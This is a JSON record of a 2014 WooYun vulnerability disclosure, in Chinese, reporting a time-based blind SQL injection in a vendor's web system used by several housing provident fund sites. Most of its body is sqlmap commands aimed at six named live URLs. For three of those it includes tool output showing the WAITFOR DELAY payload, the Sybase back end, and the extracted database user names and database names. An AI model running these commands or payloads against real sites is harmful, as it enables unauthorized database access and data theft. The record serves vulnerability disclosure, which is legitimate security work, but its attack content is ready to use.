{"id": 43196, "wybug_id": "wooyun-2014-083466", "wybug_title": "某系统存在通用型SQL盲注漏洞", "wybug_corp": "北京安泰伟奥信息技术有限公司", "wybug_author": "路人甲", "wybug_date": "2014-11-18 18:08", "wybug_open_date": "2015-02-16 18:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-18：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-02-16：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 某系统存在通用型SQL盲注漏洞 详细说明：  涉及厂家：北京安泰伟奥信息技术有限公司影响范围可以参照其官网的典型客户名单http://www.atwasoft.com/p/views/customer.html注入点：id存在SQL注入的URL如下：1、hzsgjj.com/Website/newsshow.jsp?id=125sqlmap.py -u \"hzsgjj.com/Website/newsshow.jsp?id=125\" -p \"id\" --dbs --current-user --current-db\n\n2、http://www.xngjj.gov.cn/Website/newsshow.jsp?id=535sqlmap.py -u \"http://www.xngjj.gov.cn/Website/newsshow.jsp?id=535\" -p \"id\" --dbs --current-user --current-dbsqlmap identified the following injection points with a total of 104 HTTP(s) requests:---Place: GETParameter: id    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: id=535 WAITFOR DELAY '0:0:5'-----[22:36:39] [INFO] testing MySQL[22:36:39] [WARNING] it is very important not to stress the network adapter's bandwidth during usage of time-based queries[22:36:40] [WARNING] the back-end DBMS is not MySQL[22:36:40] [INFO] testing Oracle[22:36:40] [WARNING] the back-end DBMS is not Oracle[22:36:40] [INFO] testing PostgreSQL[22:36:40] [WARNING] the back-end DBMS is not PostgreSQL[22:36:40] [INFO] testing Microsoft SQL Server[22:36:41] [WARNING] the back-end DBMS is not Microsoft SQL Server[22:36:41] [INFO] testing SQLite[22:36:41] [WARNING] the back-end DBMS is not SQLite[22:36:41] [INFO] testing Microsoft Access[22:36:42] [WARNING] the back-end DBMS is not Microsoft Access[22:36:42] [INFO] testing Firebird[22:36:42] [WARNING] the back-end DBMS is not Firebird[22:36:42] [INFO] testing SAP MaxDB[22:36:42] [WARNING] the back-end DBMS is not SAP MaxDB[22:36:42] [INFO] testing Sybase[22:36:48] [INFO] confirming Sybase[22:36:53] [INFO] the back-end DBMS is Sybaseweb application technology: JSPback-end DBMS: Sybase[22:36:53] [INFO] fetching current user[22:36:53] [INFO] retrieved:[22:36:59] [INFO] adjusting time delay to 2 seconds due to good response timesjtpsoftadmincurrent user:    'jtpsoftadmin'[22:39:25] [INFO] fetching current database[22:39:25] [INFO] retrieved: webcurrent database:    'web'[22:40:02] [INFO] fetching database names[22:40:02] [WARNING] HTTP error codes detected during testing:404 (Not Found) - 249 timesTraceback (most recent call last):  File \"thirdparty\\ansistrm\\ansistrm.pyo\", line 50, in emit  File \"lib\\core\\convert.pyo\", line 120, in stdoutencodeUnicodeDecodeError: 'ascii' codec can't decode byte 0xc5 in position 560: ordinal not in range(128)Logged from file _sqlmap.pyo, line 101Traceback (most recent call last):  File \"_sqlmap.pyo\", line 72, in main  File \"lib\\controller\\controller.pyo\", line 570, in start  File \"lib\\controller\\action.pyo\", line 89, in action  File \"plugins\\dbms\\sybase\\enumeration.pyo\", line 98, in getDbsAttributeError: SybaseMap instance has no attribute '_Enumeration__pivotDumpTable'3、http://www.tygjj.com/Website/newsshow.jsp?id=1499sqlmap.py -u \"http://www.tygjj.com/Website/newsshow.jsp?id=1499\" -p \"id\" --dbs --current-user --current-db\n\n4、http://www.sysgjj.com/Website/newsshow.jsp?id=713sqlmap.py -u \"http://www.sysgjj.com/Website/newsshow.jsp?id=713\" -p \"id\" --dbs --current-user --current-db\n\n5、http://www.fcggjj.com/Website/newsshow.jsp?id=50sqlmap.py -u \"http://www.fcggjj.com/Website/newsshow.jsp?id=50\" -p \"id\" --dbs --current-user --current-dbsqlmap identified the following injection points with a total of 104 HTTP(s) requests:---Place: GETParameter: id    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: id=50 WAITFOR DELAY '0:0:5'-----[22:49:51] [INFO] testing MySQL[22:49:51] [WARNING] it is very important not to stress the network adapter's bandwidth during usage of time-based queries[22:49:55] [WARNING] the back-end DBMS is not MySQL[22:49:55] [INFO] testing Oracle[22:50:00] [WARNING] the back-end DBMS is not Oracle[22:50:00] [INFO] testing PostgreSQL[22:50:05] [WARNING] the back-end DBMS is not PostgreSQL[22:50:05] [INFO] testing Microsoft SQL Server[22:50:11] [WARNING] the back-end DBMS is not Microsoft SQL Server[22:50:11] [INFO] testing SQLite[22:50:16] [WARNING] the back-end DBMS is not SQLite[22:50:16] [INFO] testing Microsoft Access[22:50:21] [WARNING] the back-end DBMS is not Microsoft Access[22:50:21] [INFO] testing Firebird[22:50:26] [WARNING] the back-end DBMS is not Firebird[22:50:26] [INFO] testing SAP MaxDB[22:50:31] [WARNING] the back-end DBMS is not SAP MaxDB[22:50:31] [INFO] testing Sybase[22:50:46] [INFO] confirming Sybase[22:51:02] [INFO] the back-end DBMS is Sybaseweb application technology: JSPback-end DBMS: Sybase[22:51:02] [INFO] fetching current user[22:51:02] [INFO] retrieved:[22:51:17] [INFO] adjusting time delay to 3 seconds due to good response timesjtpsoftadmincurrent user:    'jtpsoftadmin'[23:05:22] [INFO] fetching current database[23:05:22] [INFO] retrieved: wzcurrent database:    'wz'[23:08:25] [INFO] fetching database names[23:08:25] [WARNING] HTTP error codes detected during testing:404 (Not Found) - 241 timesTraceback (most recent call last):  File \"thirdparty\\ansistrm\\ansistrm.pyo\", line 50, in emit  File \"lib\\core\\convert.pyo\", line 120, in stdoutencodeUnicodeDecodeError: 'ascii' codec can't decode byte 0xc5 in position 560: ordinal not in range(128)Logged from file _sqlmap.pyo, line 101Traceback (most recent call last):  File \"_sqlmap.pyo\", line 72, in main  File \"lib\\controller\\controller.pyo\", line 570, in start  File \"lib\\controller\\action.pyo\", line 89, in action  File \"plugins\\dbms\\sybase\\enumeration.pyo\", line 98, in getDbsAttributeError: SybaseMap instance has no attribute '_Enumeration__pivotDumpTable'6、http://www.lbszfgjj.org/Website/newsshow.jsp?id=31sqlmap.py -u \"http://www.lbszfgjj.org/Website/newsshow.jsp?id=31\" -p \"id\" --dbs --current-user --current-dbsqlmap identified the following injection points with a total of 104 HTTP(s) requests:---Place: GETParameter: id    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: id=31 WAITFOR DELAY '0:0:5'-----[07:36:19] [INFO] testing MySQL[07:36:19] [WARNING] it is very important not to stress the network adapter's bandwidth during usage of time-based queries[07:36:24] [WARNING] the back-end DBMS is not MySQL[07:36:24] [INFO] testing Oracle[07:36:29] [WARNING] the back-end DBMS is not Oracle[07:36:29] [INFO] testing PostgreSQL[07:36:33] [WARNING] the back-end DBMS is not PostgreSQL[07:36:33] [INFO] testing Microsoft SQL Server[07:36:38] [WARNING] the back-end DBMS is not Microsoft SQL Server[07:36:38] [INFO] testing SQLite[07:36:43] [WARNING] the back-end DBMS is not SQLite[07:36:43] [INFO] testing Microsoft Access[07:36:48] [WARNING] the back-end DBMS is not Microsoft Access[07:36:48] [INFO] testing Firebird[07:36:53] [WARNING] the back-end DBMS is not Firebird[07:36:53] [INFO] testing SAP MaxDB[07:36:57] [WARNING] the back-end DBMS is not SAP MaxDB[07:36:57] [INFO] testing Sybase[07:37:07] [INFO] confirming Sybase[07:37:17] [INFO] the back-end DBMS is Sybaseweb application technology: JSPback-end DBMS: Sybase[07:37:17] [INFO] fetching current user[07:37:17] [INFO] retrieved:[07:37:27] [INFO] adjusting time delay to 4 seconds due to good response times[07:38:08] [INFO] adjusting time delay to 3 seconds due to good response times[07:38:14] [ERROR] invalid character detected. retrying..[07:38:14] [WARNING] increasing time delay to 4 secondsjtpadmincurrent user:    'jtpadmin'[07:46:14] [INFO] fetching current database[07:46:14] [INFO] retrieved: gjjwebcurrent database:    'gjjweb'[07:52:14] [INFO] fetching database names[07:52:14] [WARNING] HTTP error codes detected during testing:404 (Not Found) - 249 timesTraceback (most recent call last):  File \"thirdparty\\ansistrm\\ansistrm.pyo\", line 50, in emit  File \"lib\\core\\convert.pyo\", line 120, in stdoutencodeUnicodeDecodeError: 'ascii' codec can't decode byte 0xc5 in position 560: ordinal not in range(128)Logged from file _sqlmap.pyo, line 101Traceback (most recent call last):  File \"_sqlmap.pyo\", line 72, in main  File \"lib\\controller\\controller.pyo\", line 570, in start  File \"lib\\controller\\action.pyo\", line 89, in action  File \"plugins\\dbms\\sybase\\enumeration.pyo\", line 98, in getDbsAttributeError: SybaseMap instance has no attribute '_Enumeration__pivotDumpTable'   漏洞证明：  已证明   修复方案：  过滤特殊字符   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}